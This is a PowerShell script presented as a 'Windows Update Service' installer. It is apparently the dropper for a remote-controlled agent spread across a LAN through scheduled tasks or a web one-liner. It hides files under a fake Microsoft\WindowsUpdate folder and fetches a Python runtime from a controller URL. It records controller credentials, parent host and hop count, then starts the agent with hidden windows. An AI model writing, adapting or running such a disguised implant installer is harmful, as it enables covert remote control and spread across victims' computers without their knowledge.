<#
  Windows Update Service - remote installer.

  Called by the LAN push (schtasks -> powershell -File i.ps1 -Kit <dir>) and by
  the web one-liner.  Needs nothing installed on the target.

  -Kit   directory containing kit.zip, or a loose bundle
  -Base  controller base url, used only to fetch a private Python if needed
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Kit,
    [string]$Base = "",
    [string]$Parent = "",
    [string]$ParentIp = "",
    [string]$Group = "",
    [int]$Hop = 1,
    [switch]$Quiet,
    [switch]$NoStart
)

$ErrorActionPreference = 'Stop'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Say([string]$m) { if (-not $Quiet) { Write-Host $m } }

$target = Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate'
New-Item -ItemType Directory -Force -Path $target | Out-Null

# ---------------------------------------------------------------- stage bundle
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = Join-Path $Kit 'kit.zip'

# Owned paths are removed first: ExtractToDirectory throws on an existing file.
foreach ($owned in 'syspy', 'install', 'agent.py', 'bootstrap.py') {
    $p = Join-Path $target $owned
    if (Test-Path $p) { Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue }
}

if (Test-Path $zip) {
    Say "  staging bundle from kit.zip"
    [IO.Compression.ZipFile]::ExtractToDirectory($zip, $target)
    Copy-Item $zip (Join-Path $target 'kit.zip') -Force
} else {
    Say "  staging loose bundle"
    foreach ($owned in 'syspy', 'install') {
        $src = Join-Path $Kit $owned
        if (Test-Path $src) { Copy-Item $src $target -Recurse -Force }
    }
    foreach ($owned in 'agent.py', 'bootstrap.py') {
        $src = Join-Path $Kit $owned
        if (Test-Path $src) { Copy-Item $src $target -Force }
    }
}

# ---------------------------------------------------------------- interpreter
function Resolve-ConsolePython {
    $candidates = @()
    foreach ($n in 'python.exe', 'py.exe') {
        $c = Get-Command $n -ErrorAction SilentlyContinue
        if ($c) { $candidates += $c.Source }
    }
    foreach ($c in $candidates) {
        $pre = @()
        if ((Split-Path $c -Leaf) -ieq 'py.exe') { $pre = @('-3') }
        try {
            $v = & $c @pre -c "import sys;print(sys.version_info[0])" 2>$null
            if ("$v".Trim() -eq '3') { return @{ Exe = $c; Pre = $pre } }
        } catch {}
    }
    return $null
}

function To-Windowless([string]$exe) {
    $leaf = Split-Path $exe -Leaf
    if ($leaf -ieq 'python.exe') {
        $w = Join-Path (Split-Path $exe) 'pythonw.exe'
        if (Test-Path $w) { return $w }
    }
    if ($leaf -ieq 'py.exe') {
        $w = Join-Path (Split-Path $exe) 'pyw.exe'
        if (Test-Path $w) { return $w }
    }
    return $exe
}

$py = $null
$rt = Join-Path $target 'runtime'
foreach ($n in 'pythonw.exe', 'python.exe') {
    $p = Join-Path $rt $n
    if (Test-Path $p) { $py = @{ Exe = $p; Pre = @() }; break }
}
if (-not $py) { $py = Resolve-ConsolePython }

if (-not $py -and $Base) {
    Say "  fetching a private Python"
    $tmp = Join-Path $env:TEMP 'wu-py.zip'
    Invoke-WebRequest "$($Base.TrimEnd('/'))/wu/py.zip" -UseBasicParsing -OutFile $tmp
    Remove-Item $rt -Recurse -Force -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Force -Path $rt | Out-Null
    [IO.Compression.ZipFile]::ExtractToDirectory($tmp, $rt)
    # An embeddable build ignores site and the script dir until told; ".." puts
    # the bundle root on sys.path so `import syspy` resolves.
    Get-ChildItem $rt -Filter '*._pth' | ForEach-Object {
        $lines = Get-Content $_.FullName
        $lines = $lines -replace '^\s*#import\s*site\s*$', 'import site'
        if ($lines -notcontains 'import site') { $lines += 'import site' }
        if ($lines -notcontains '..') { $lines += '..' }
        Set-Content $_.FullName $lines -Encoding ASCII
    }
    foreach ($n in 'pythonw.exe', 'python.exe') {
        $p = Join-Path $rt $n
        if (Test-Path $p) { $py = @{ Exe = $p; Pre = @() }; break }
    }
}

# ---------------------------------------------------------------- deploy.json
$deploy = [ordered]@{
    url          = $Base
    room         = $env:SYSPY_ROOM
    pass         = $env:SYSPY_PASS
    parent       = $Parent
    parent_ip    = $ParentIp
    hop          = $Hop
    group        = $Group
    installed_at = [int](New-TimeSpan -Start (Get-Date '1970-01-01') -End (Get-Date)).TotalSeconds
}
[IO.File]::WriteAllText(
    (Join-Path $target 'deploy.json'),
    ($deploy | ConvertTo-Json),
    (New-Object Text.UTF8Encoding($false)))

# ---------------------------------------------------------------- launch
if (-not $NoStart -and $py) {
    $args = @()
    $args += $py.Pre
    $args += (Join-Path $target 'agent.py')
    $args += @('--hidden')
    Say "  starting agent"
    Start-Process -FilePath (To-Windowless $py.Exe) -ArgumentList $args -WindowStyle Hidden
}
'ok'
